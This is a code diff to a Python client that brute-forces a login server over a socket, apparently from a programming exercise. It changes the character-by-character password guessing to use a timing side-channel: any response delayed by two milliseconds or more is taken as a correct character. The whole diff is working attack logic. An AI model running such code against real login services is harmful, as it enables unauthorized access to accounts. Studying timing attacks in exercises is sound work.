@@ -3,6 +3,7 @@ import sys
 from itertools import product
 import os
 import json
+from datetime import datetime
 
 base_path = os.path.dirname(__file__)
 login_list_file = os.path.join(base_path, 'logins.txt')
@@ -47,18 +48,20 @@ with socket.socket() as connection_socket:
             password = password[:i] + char + password[i+1:]
             data = {'login': login, 'password': password}
             data = json.dumps(data)
+            # Start Time Measurement
+            start = datetime.now()
             # Send Password
             connection_socket.send(data.encode())
             # Get Response
-            response = connection_socket.recv(1024).decode()
-            try:
-                response = json.loads(response)
-            except:
-                print(password, data, response)
-            # Print Data and Break if Password is Found
-            if response['result'] == 'Exception happened during login':
+            response = json.loads(connection_socket.recv(1024).decode())['result']
+            # Find Time Difference
+            finish = datetime.now()
+            difference = finish - start
+            # If time different is large current character is correct
+            if difference.microseconds >= 2000 and response == 'Wrong password!':
                 break
-            if response['result'] == 'Connection success!':
+            # Print Data and Break if Password is Found
+            if response == 'Connection success!':
                 print(data)
                 password_found = True
                 break
